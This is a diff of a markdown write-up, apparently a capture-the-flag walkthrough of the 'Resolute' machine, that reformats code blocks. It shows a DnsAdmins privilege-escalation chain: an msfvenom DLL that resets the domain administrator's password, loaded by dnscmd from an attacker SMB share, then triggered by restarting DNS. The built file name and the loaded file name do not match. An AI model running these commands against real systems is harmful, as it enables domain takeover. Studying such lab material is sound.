@@ -164,7 +164,9 @@ We should need to compile a dll using `msfvenom` and configure the locally runni
 
 we're going to use a payload that doesn't cause the **DNS** service to hang. It should be something simple like changing the the domain administrator's password
 
-`msfvenom -p windows/x64/exec cmd='net user administrator $$Y0uJustG0tOwn3d$$ /domain' -f dll > owned.dll`
+```bash
+msfvenom -p windows/x64/exec cmd='net user administrator $$Y0uJustG0tOwn3d$$ /domain' -f dll > owned.dll
+```
 
 ![killer-dll](/assets/Resolute/killer-dll.jpg)
 
@@ -174,11 +176,13 @@ we then host it using **Impacket's** `smbserver.py`
 
 *after that,* we're going to reconfigure the **DNS** service using `dnscmd` with the `/config` flag along with `/serverlevelplugindll` pointing to our **SMB** share named `share`. It should be as below:
 
-`dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll`
+```
+dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll
+```
 
 we can then trigger the execution by stopping the **DNS** service and restarting it.
 
-```
+```shell
 sc.exe stop dns
 sc.exe start dns
 ```
